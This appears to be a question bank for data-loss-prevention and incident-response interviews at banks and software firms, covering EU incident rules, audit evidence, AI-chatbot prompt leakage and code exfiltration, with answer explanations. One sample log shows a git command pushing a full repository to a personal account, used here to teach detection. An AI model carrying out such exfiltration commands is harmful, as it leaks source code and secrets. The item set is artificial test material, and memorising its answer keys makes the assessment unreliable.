explanation.correct: Delegated Regulation (EU) 2024/1772 art. 7 sets the method. Costs and losses are counted without accounting for financial recoveries, so the insurance payout is not deducted. Advisory costs (legal, forensic), redress and compensation to customers, and staff costs such as overtime are all listed types. Costs to enhance the business after the incident, including upgrades, are excluded (art. 7(2)(b)), as are day-to-day running costs and insurance premiums. That gives 60,000 + 30,000 + 25,000 = EUR 115,000, which is above the EUR 100,000 threshold of art. 9(6) (costs and losses that have exceeded or are likely to exceed it). This is one threshold among several: major classification also needs critical services affected and either the unauthorised-access threshold or two thresholds met. For management, show the gross figure, recoveries separately and estimates labelled as such.

distractors.a: Deducting the insurance payout is the natural accounting instinct, but the regulation counts costs without financial recoveries.
distractors.c: The upgrade improves the business after the incident; art. 7(2)(b) excludes such costs even though the incident prompted them.
distractors.d: This gets both rules backwards: the upgrade is excluded and the recovery is not deducted.

explanation.interview_angle: Whether you can quantify impact by the rules the regulator uses rather than by intuition.

references.title: Commission Delegated Regulation (EU) 2024/1772 (classification of ICT-related incidents)

questions.question: A DLP rule flags an analyst in a listed bank's finance team emailing the draft quarterly results, due to be published next week, to a personal webmail address. The file holds no personal data. Besides the normal DLM steps, what should the L2 analyst do?

options.text: Close the case as low impact, because no personal data left the bank and GDPR therefore does not apply
Email the analyst to ask why the file was sent, so the case can be closed quickly if there is a reason
Ask the webmail provider to delete the message, because that removes the market risk at the source
Escalate promptly to Compliance as a possible leak of inside information, alongside the DLM case

explanation.correct: Unpublished results of a listed company can be inside information under the Market Abuse Regulation: precise, not public, and likely to have a significant effect on the share price if made public (art. 7). Disclosing it outside the normal exercise of one's job can be unlawful disclosure (art. 10), and someone could trade on it before publication. That is the 'market' dimension of a bank's impact assessment, and it belongs with Compliance, which handles insider lists and market-abuse questions and decides what follows. The DLM case continues in parallel (containment, evidence, HR and Legal as needed), but the market question cannot wait for it to close.

distractors.a: GDPR is only one impact dimension; price-sensitive financial data can do serious market and regulatory harm without containing any personal data.
distractors.b: Contacting the employee before Compliance and Legal agree the approach can tip him off and lead to evidence being deleted.
distractors.c: A third-party mail provider will not act on such a request, and deletion would not show whether the information was already passed on or used.

explanation.interview_angle: Whether you assess leaks beyond personal data and know which function owns market-sensitive information.

references.title: Market Abuse Regulation, Regulation (EU) No 596/2014, Official Journal text

questions.subtopic: closing a case and handing over to the second line
questions.question: A confirmed data-leakage case at a bank is ready to leave the first-line DLM team. Put the closing steps in order.

options.text: Document the root cause and the control gap that allowed the leak
Close the DLM case with a reference to the risk record that tracks the remediation
Verify that the containment actions have taken effect, such as access removed and deletion confirmed
Hand the control gap over to the second-line risk function with a proposed remediation owner and due date
Finalise the impact assessment with confirmed figures and the record of notification decisions

explanation.correct: First make sure the exposure has actually ended: until containment is verified, the impact figures can still grow. The impact assessment can then be finalised with confirmed numbers, together with the notification decisions and their timestamps, which regulators and auditors will ask for. The root cause and the control gap (a missing rule, an unmonitored channel, an over-broad access right) explain why the leak was possible. That gap is what the second line of defence (the risk or compliance oversight function) needs: it records the risk, agrees a remediation owner and due date, and follows up independently. Only then is the DLM case closed, with a reference to that risk record, so that the remediation is not lost when the incident ticket is closed.
explanation.interview_angle: Whether you close incidents so that the control weakness is owned and tracked, not just the ticket.

references.title: NIST SP 800-61 Rev. 3, Incident Response Recommendations and Considerations

questions.subtopic: audit log retention and audit evidence
questions.question: An internal auditor asks for 14-month-old file-sharing audit records from the company's cloud productivity suite. At the company's licence tier, the suite keeps audit records for 180 days. What should the DLP engineer do?

options.text: Run the audit search again with a wider date range, since older records are only hidden from the default view
Ask the vendor's support team to restore the expired records from its backups in time for the audit
Check whether the records were exported to the SIEM or an archive; if not, report the gap and fix retention
Rebuild the evidence from DLP alert screenshots and present it to the auditor as equivalent to the audit log

explanation.correct: In Microsoft Purview, for example, Audit (Standard) keeps records for 180 days (90 days for records generated before 17 October 2023). Audit (Premium) keeps Exchange, SharePoint, OneDrive and Entra records for one year by default for E5-licensed users, and custom audit retention policies can go up to 10 years with an add-on licence. Records past the retention period are not searchable in the platform, so the only remaining source is a copy taken earlier, typically records exported through the Office 365 Management Activity API into a SIEM or archive. If no such copy exists, the honest answer to the auditor is the gap itself, with a remediation: export or longer retention from now on, sized to the evidence the bank's policies and regulators require. Note that even the one-year Premium default would not cover 14 months.

distractors.a: Retention is a hard limit, not a display filter; widening the search range cannot return records that have expired.
distractors.b: The documented retention period is the limit you plan around; audit evidence cannot rest on an undocumented restore.
distractors.d: Screenshots of alerts are a different, partial source; presenting them as the audit log misleads the auditor and damages trust in all other evidence.

explanation.interview_angle: Whether you know your log retention before the auditor asks, and report gaps honestly.

references.title: Microsoft Learn: Manage audit log retention policies
Microsoft Learn: Learn about auditing solutions in Microsoft Purview

questions.question: A DLP alert shows a bank employee emailing a file with 2,000 client names and addresses to the domain of the bank's statement-printing supplier. Which TWO checks decide whether this was authorised sharing?

options.text: Whether the supplier's mail domain has a valid TLS certificate and an SPF record
Whether a contract with data-processing terms covers this supplier, these data and this purpose
Whether the supplier is a large, well-known company with a good security reputation
Whether the employee is authorised to send such files and used the channel agreed for this supplier
Whether the file was sent during business hours from the employee's usual device

explanation.correct: Sharing client data with a supplier is authorised when there is a legal and contractual basis for this transfer and it follows the agreed process. Under GDPR art. 28 a processor such as a printing supplier must be bound by a contract that sets out the subject matter, purpose, types of data and the processor's obligations; the analyst checks that the contract (often listed in a supplier or outsourcing register) covers this supplier, these data and this purpose. The second check is the process: is the employee in the role that sends these files, and was the agreed channel used (for example the dedicated secure transfer set up for this supplier) rather than ordinary email? A transfer to the right supplier through an unapproved channel, or by someone without that role, is still a policy breach to handle.

distractors.a: Transport security and email authentication show the message travelled safely to a real domain, not that the bank was allowed to send the data there.
distractors.c: A supplier's reputation is a due-diligence input, not authorisation; without a contract covering the data, the transfer has no basis.
distractors.e: Time and device help judge whether the account was misused, but a transfer can be in hours, from the usual laptop, and still be unauthorised.

explanation.interview_angle: Whether you separate 'legitimate destination' from 'authorised transfer' when triaging supplier traffic.

references.title: GDPR art. 28: Processor

questions.question: A bank's managed file-transfer provider tells the bank on Tuesday at 11:00 that client payment files were exposed through the provider's misconfiguration since Sunday. The provider offers to handle all regulatory reporting itself. How should the bank's IR lead treat this?

options.text: Run the bank's own DORA classification and GDPR assessment from Tuesday 11:00 and keep ownership of any reports
Accept the offer, because the provider caused the incident and therefore carries the reporting obligations for it
Count all reporting clocks from Sunday, when the exposure began, and file every report as late with the reasons
Wait for the provider's root-cause report before assessing, as the bank cannot classify an incident in a system it does not run

explanation.correct: Outsourcing a service does not outsource accountability. DORA art. 28(1)(a) keeps financial entities fully responsible for their obligations when they use ICT third-party services, and art. 19(5) allows the reporting work to be outsourced only with the financial entity remaining fully responsible for it. Under GDPR the provider, as processor, must inform the bank without undue delay (art. 33(2)), and EDPB Guidelines 9/2022 treat the controller as aware once the processor has informed it, so Tuesday 11:00 is the bank's awareness time for its own assessment. The bank classifies the incident, decides on notifications and signs the reports; the provider supplies facts, logs and its root-cause analysis.

distractors.b: The provider can help prepare reports, but DORA keeps the bank fully responsible and GDPR places the notification decision on the controller.
distractors.c: Reporting clocks run from awareness (and, for DORA, classification); Sunday matters for the incident's duration, which DORA measures from occurrence, not for the deadlines.
distractors.d: Classification and the GDPR assessment use the information available and allow estimates; waiting for the provider's full analysis would miss the deadlines.

explanation.interview_angle: Whether you keep a supplier incident under the bank's own reporting ownership and clocks.

references.title: DORA, Regulation (EU) 2022/2554, Official Journal text
EDPB Guidelines 9/2022 on personal data breach notification under GDPR
Commission Delegated Regulation (EU) 2024/1772 (classification of ICT-related incidents)

questions.question: An L1 analyst closes a DLP alert as approved business activity: the monthly payroll file was sent to the company's payroll provider. Which closure note gives an auditor what they need?

options.text: 'Legitimate business activity, closed as expected behaviour for this department.'
'Contracted payroll provider, agreed channel; matches exception EX-0142 (owner: HR director, valid to 31 Dec), checked in the register.'
'Spoke to the sender, who confirmed by phone that the provider needs this file each month and that it was sent on purpose; no further action needed.'
'Closed as false positive: this rule fires on the payroll file every month, so it is expected noise and needs no review from anyone in the team.'

explanation.correct: An auditor tests whether the control works by re-performing a sample: for each closed alert, can they see why it was closed and check it against independent evidence? Note b gives the facts that justify the disposition (contracted recipient, agreed channel), the approval it relies on (exception ID, owner, expiry) and what the analyst verified it against. Anyone can trace it to the exception register and confirm that the exception was valid on that date. It also distinguishes approved activity (a real match on real data, allowed by an owner's decision) from a false positive (the rule matched something that is not sensitive data).

distractors.a: It records a conclusion with no evidence; an auditor cannot tell whether anyone checked anything.
distractors.c: The sender's own word is not independent evidence of authorisation; the note should reference the approval that permits the transfer.
distractors.d: The payroll file really contains personal data, so this is approved activity, not a false positive; mislabelling it distorts tuning metrics and hides the need for a documented exception.

explanation.interview_angle: Whether your case notes would stand up when an auditor samples them months later.

references.title: NIST SP 800-61 Rev. 3, Incident Response Recommendations and Considerations

questions.subtopic: preparing audit evidence for DLP SLA compliance
questions.question: A bank's internal audit asks the MSSP that runs its DLP monitoring for evidence that high-severity DLP alerts were handled within SLA last quarter. Put the MSSP analyst's steps in order.

options.text: Remove or mask customer content not needed for the test, keeping identifiers the auditor can trace
Agree the scope with the auditor: period, alert population, SLA definition and evidence format
Have a second person review the pack, then deliver it through the agreed secure channel and log what was sent
Reconcile the extract's count against the DLP platform's own alert count for the period
Extract all high-severity alerts with their timestamps from the case system, recording the query used

explanation.correct: Scope comes first: an SLA measured from alert creation or from assignment, or a 'quarter' read as calendar or contractual, gives different results, and agreeing the definition avoids rework and disputes. The extract should be the full population (not a hand-picked sample) with the query recorded, so the auditor can re-run it. Reconciling the count against the DLP platform proves completeness: alerts that never reached the case system are exactly what an auditor looks for. Only then is the pack reduced to what the test needs, masking customer content while keeping traceable identifiers. A second review before delivery catches errors, and logging what was sent through which channel protects both the MSSP and the bank.
explanation.interview_angle: Whether you can produce complete, verifiable and minimised evidence, which is what auditors of a managed service test.

references.title: NIST SP 800-61 Rev. 3, Incident Response Recommendations and Considerations

questions.subtopic: generative-AI prompts as a leakage channel
questions.question: A bank's DLP console shows that an employee pasted text with 25 customer names and IBANs into a free, public AI chatbot and submitted it. The rule was in monitor mode, so nothing was blocked. How should the L1 analyst treat the event?

options.text: As a near miss: the text stays inside the chat session and only becomes a leak if the chatbot later repeats it to another user
As a likely disclosure of customer data to a third party, escalated for impact assessment like any external transfer
As resolved once the employee confirms the conversation was deleted, since deleting it removes the data from the provider's systems
As a tuning matter only, because a rule in monitor mode is not meant to produce incidents that need handling

explanation.correct: Submitting a prompt sends the text to the AI provider's servers. With a free consumer service the bank has no contract covering retention, reuse or deletion, and it cannot verify any of them, so 25 customers' names and IBANs have left the bank's control. The event is handled like an email or upload to an unknown external party: confirm the facts, then escalate under the DLM process for impact assessment, including whether GDPR notification applies. OWASP lists this risk as LLM02 Sensitive Information Disclosure. Tools treat it as a channel in its own right: Microsoft Purview's one-click policy 'DSPM for AI: Detect sensitive info added to AI sites' discovers sensitive content pasted or uploaded to AI sites, in audit mode.

distractors.a: The disclosure happens when the prompt reaches the provider, not when the model repeats it. Whether the model ever repeats it is out of the bank's sight and does not change the transfer.
distractors.c: Deleting a conversation in the user interface does not prove what the provider keeps in logs or backups. A user's assurance is not evidence the bank can rely on.
distractors.d: Monitor mode decides whether the tool blocks, not whether a real transfer took place. The rule worked and recorded an actual disclosure that needs handling.

explanation.interview_angle: Whether you treat an AI prompt as an outbound channel to a third party rather than as harmless chat.

references.title: OWASP LLM02:2025 Sensitive Information Disclosure
Microsoft Learn: Considerations for deploying Microsoft Purview DSPM for AI

questions.subtopic: scoping a prompt disclosure from gateway logs
questions.question: The incident lead at a bank reviews the gateway records below for one AI chat request. Which conclusion about the scope of the disclosure do they support?
questions.context:
Secure web gateway, user a.pop@bank.example, host LT-RET-0412 (UTC)
2026-10-20 10:13:55 app='AI chat (consumer)' category='AI & ML Applications' rule='AI apps - caution' action=Caution
2026-10-20 10:14:01 same session: user selected 'Continue' on the warning page
2026-10-20 10:14:09 POST https://chat.ai-assistant.example/api/conversation status=200 bytes_out=48213
    dlp_rule='Customer IBAN - monitor' action=Allow matches: IBAN x31, person name x29
    captured_prompt='Put this in a table sorted by balance: Ion Vasile RO** **** **** 0418 ... ' [capture limit 2 KB reached]
2026-10-20 10:14:12 GET https://chat.ai-assistant.example/api/conversation/stream status=200 bytes_in=6904

options.text: Only the customers visible in the captured prompt were disclosed, because the rest of the request was cut off before it was sent
Nothing left the bank, because a Caution action holds the request until the security team approves it
About 30 customers' IBANs and names were sent and accepted; the captured text is only an excerpt
The scope cannot be assessed at all, because the prompt text is truncated and the DLP rule was only monitoring

explanation.correct: Read the records in order. Caution showed a warning page, the user chose 'Continue', and the POST returned 200 with 48,213 bytes sent, so the request reached the AI service. The DLP rule inspected the request and counted 31 IBANs and 29 names (some customers hold two accounts); its 'Allow' only reflects monitor mode. The captured prompt is far shorter than the request because prompt capture keeps only a size-limited excerpt: Zscaler's 'Capture Prompts' setting, for example, stores Gen AI prompts up to 2 KB in its logs. Scope therefore comes from the match counts and from identifying the source the user copied from (a CRM export, a spreadsheet), not from the excerpt. The 6,904-byte response means the generated table now also sits in the chat history at the provider. Next: confirm the customer list from the source, assess GDPR notification, and ask the user to delete the conversation while recording that deletion cannot be verified.

distractors.a: The capture limit truncates the log entry, not the request. The DLP engine saw 31 IBANs in a 48 KB body, which is far more than the excerpt shows.
distractors.b: Caution is a warn-and-continue action, not a hold. The log shows 'Continue' and an HTTP 200 on the POST.
distractors.d: Monitor mode and a truncated excerpt limit detail, not scope: the match counts and byte count give a bounded figure that is good enough to start the impact assessment.

explanation.interview_angle: Whether you know that captured prompt text is an excerpt and scope a disclosure from the inspection results and the source data instead.

references.title: Zscaler: Configuring Advanced Policy Settings (Gen AI Prompt Configuration)
Zscaler: Adding an AI & ML Applications Rule for Cloud App Control

questions.subtopic: guardrails vs DLP for AI prompts
questions.question: A customer asks a security-service-edge vendor to stop staff pasting payment card numbers into AI chat apps while keeping the apps available. A colleague of the solutions engineer suggests enabling only a guardrail profile that moderates prompts for injection, jailbreak attempts and harmful topics. What should the engineer propose instead?

options.text: An inline DLP rule with a card-number profile scoped to AI apps and their post and upload activity, plus guardrails for injection
The same guardrail profile set to its highest confidence level, so that it also catches card numbers along with other harmful prompts
A block on the whole AI application category for every user, since card data cannot be separated from ordinary prompt text
Prompt capture for all AI apps, with analysts reviewing the captured prompts every week and following up on any card numbers

explanation.correct: Two different problems need two different engines. Guardrails judge the intent and topic of a prompt or response; card numbers are a data-identification problem, solved by a DLP identifier that combines a pattern, a checksum and context. In Netskope's documentation, for example, AI Guardrails is described as a content moderation service against prompt injection, jailbreaking and harmful content, while DLP profiles (with predefined PCI, PHI and PII profiles) are attached to Real-time Protection policies and raise incidents under Incidents > DLP. The same design in Zscaler is an Inline DLP rule whose criteria include the cloud application or URL category. Scoping the DLP rule to AI apps and to the activities that send data keeps the apps usable for everything else, and the guardrail profile stays as a separate control for injection risk.

distractors.b: A confidence level tunes how sure the classifier must be for its own categories; it does not turn a topic classifier into a card-number detector.
distractors.c: This meets the security goal but breaks the stated business need, and blanket blocks tend to push users to personal devices where nothing is inspected.
distractors.d: Weekly review of captured prompts is detection after the fact: the card numbers have already reached the provider by the time anyone reads them.

explanation.interview_angle: Whether you can tell content moderation for AI apps apart from data loss prevention and combine them correctly.

references.title: Netskope: AI Guardrails
Netskope: DLP Profiles

questions.subtopic: ready-made AI policies in audit and test mode
questions.question: A week ago a bank's data-security team switched on the vendor's recommended one-click policies for AI apps, both the discovery and the protection ones. An L2 analyst now sees dozens of events of customer data pasted into consumer AI sites, yet no paste was blocked and no user saw a warning. What is the most likely explanation?

options.text: The endpoint agents are not reporting correctly, so their health has to be fixed before the policies can work
Consumer AI sites encrypt traffic end to end, so the policy can record the paste but has no way to stop it
Ready-made policies apply only to a pilot group, so these users were never in the scope of the protection policy
The discovery policy only audits; the blocking policy starts in test mode and covers elevated-risk users only

explanation.correct: Microsoft Purview DSPM for AI documents exactly this behaviour. 'DSPM for AI: Detect sensitive info added to AI sites' covers all users and groups in audit mode only, which is why the analyst sees events. 'DSPM for AI - Block sensitive info from AI sites' uses Adaptive Protection to give a block-with-override only to elevated-risk users, and it is created in test mode. So nothing is blocked until someone reviews the test results and turns the policy on, and even then ordinary users are not blocked unless another policy covers them. The analyst's job is to treat the logged events as real disclosures and to report the gap to the policy owner with numbers, so that the decision to enforce is made consciously.

distractors.a: The events are arriving, which shows the agents are reporting. Broken agents would show silence, not detailed paste events.
distractors.b: The policies act on the device or browser before the text is sent, so encryption on the wire is not the obstacle; the documented block policies exist for this very case.
distractors.c: The discovery policy is documented as covering all users and groups; the limit on the protection side is mode and risk level, not a pilot group.

explanation.interview_angle: Whether you check a policy's mode and scope before blaming the tooling, and know that 'deployed' is not the same as 'enforcing'.

references.title: Microsoft Learn: Considerations for deploying Microsoft Purview DSPM for AI
Microsoft Learn: Help dynamically mitigate risks with Adaptive Protection

questions.question: A bank's collaboration-platform DLP policy blocks chat messages containing IBANs sent to people outside the bank. Testing shows it works when a bank employee starts a chat with a supplier, but the same message is delivered when the employee posts it in a group chat that the supplier created from its own tenant. What explains the difference?

options.text: Policy changes take time to synchronise, so the second test ran before the policy reached the employee's account
The platform inspects only messages addressed to guest accounts, and the supplier's people were never added as guests
In chats across organisations, DLP is enforced by the tenant hosting the chat, so the bank's policy never runs there
The IBAN detector needs a higher instance count in group chats, so a single IBAN falls below the rule's threshold

explanation.correct: Microsoft's documentation for DLP in Teams states that in cross-tenant conversations through external access, enforcement is based on the hosting tenant, the one that started the chat. Messages sent by the bank's users in a chat hosted by the supplier are evaluated only against the supplier's policies, if any; the bank's home-tenant policies do not follow its users into that chat. The first test passed because the bank hosted that chat. Compensating controls: allow external access only for approved partner domains, require sensitive work with suppliers to happen in bank-hosted chats or in teams where suppliers join as guests (where the bank's policies apply), and cover the residual risk through user guidance and contracts.

distractors.a: A sync delay would affect both tests, and the first one, run with the same policy, was blocked.
distractors.b: The first test shows the policy already acts on messages to external-access participants who are not guests, so guest status is not what decides it.
distractors.d: Nothing in the test changed the number of IBANs; the only difference between the two runs is which organisation hosted the chat.

explanation.interview_angle: Whether you know that a DLP policy's reach ends at the boundary of the platform tenant that hosts the conversation, and design for that.

references.title: Microsoft Learn: Data loss prevention and Microsoft Teams
Microsoft Learn: Use guest access and external access to collaborate with people outside your organization

questions.subtopic: source code pushed to a personal repository
questions.question: A software company's EDR and web gateway recorded the events below for a developer's workstation. What do they show?
questions.context:
EDR, host WS-DEV-118, user d.stan (UTC)
2026-10-19 18:02:11 process=git.exe cmdline='git remote add mirror https://code-host.example/dstan-dev/billing-core.git'
2026-10-19 18:02:37 process=git.exe cmdline='git push mirror --all'

Web gateway, same host and user
2026-10-19 18:02:38 GET https://code-host.example/dstan-dev/billing-core.git/info/refs?service=git-receive-pack status=200
2026-10-19 18:02:41 POST https://code-host.example/dstan-dev/billing-core.git/git-receive-pack status=200 bytes_out=186412903 category=Software Development

Note: the company's own repositories live under https://code-host.example/examplecorp/

options.text: Every branch of billing-core, with its history, was pushed to a personal account on the company's own code host
A routine fetch of the latest changes, because the info/refs request is how git checks for updates before pulling
A normal push to the company's repositories, because the destination domain is the approved code-hosting service
A push that was rejected, because a single POST right after the info/refs check means the upload never went through

explanation.correct: Git over HTTPS uses two services: 'git-upload-pack' to fetch and 'git-receive-pack' to push. The GET on info/refs?service=git-receive-pack is the push handshake, and the POST to git-receive-pack carried about 186 MB of packed objects. The EDR lines say why: a new remote named 'mirror' pointing at the 'dstan-dev' namespace, then 'git push --all', which sends every branch with its full history (including any secret ever committed). The path, not the domain, separates personal from corporate: 'examplecorp' is the company's organisation, 'dstan-dev' is not. ATT&CK tracks this as T1567.001, Exfiltration to Code Repository. Next: preserve the evidence, check with the code host whether the repository is public and what refs it now holds, rotate secrets present in the history, and escalate through the insider-risk route. Control gap: a domain allowlist cannot tell the two apart; it needs organisation-aware rules on the gateway or enterprise restrictions on the code host.

distractors.b: A fetch uses service=git-upload-pack and mostly downloads data; this exchange names git-receive-pack and uploads 186 MB.
distractors.c: The domain is shared by everyone on the code host; the namespace in the path is 'dstan-dev', not the company's 'examplecorp'.
distractors.d: A smart-HTTP push is normally exactly one handshake GET followed by one POST; one POST of this size with status 200 is what a push looks like.

explanation.interview_angle: Whether you read URL paths and git protocol details instead of trusting an approved domain.

references.title: MITRE ATT&CK T1567.001 Exfiltration to Code Repository
MITRE ATT&CK T1213.003 Data from Information Repositories: Code Repositories

questions.subtopic: secrets committed to a public repository
questions.question: A developer at a software company notices that a cloud access key was committed to a public repository an hour ago. They have already pushed a new commit that removes the key from the file. What is the essential next step?

options.text: Nothing more, because the latest version of the file no longer contains the key
Make the repository private, which takes the key out of public view and ends the exposure
Rewrite the repository history to remove the commit, and treat that as the complete fix
Revoke and rotate the key, then check its activity logs from the moment it was pushed

explanation.correct: Once a secret has been public, assume someone has it: public repositories are cloned and scanned by automated tools, and any copy taken in that hour still holds the key. Revoking and replacing the key is the only step that makes those copies useless, and the provider's activity logs for that key since the push show whether it was used. Cleaning the history can follow as hygiene, but it is not containment. Prevention belongs before the push: for example, GitHub's push protection blocks pushes that contain supported secrets before they reach the repository, and pre-commit scanning on developer machines catches them earlier still. ATT&CK describes the attacker side as T1552.001, Credentials In Files.

distractors.a: The removal is a new commit; the key is still in the earlier commit in the history, and in every clone taken meanwhile.
distractors.b: Hiding the repository now does not recall copies already made while it was public.
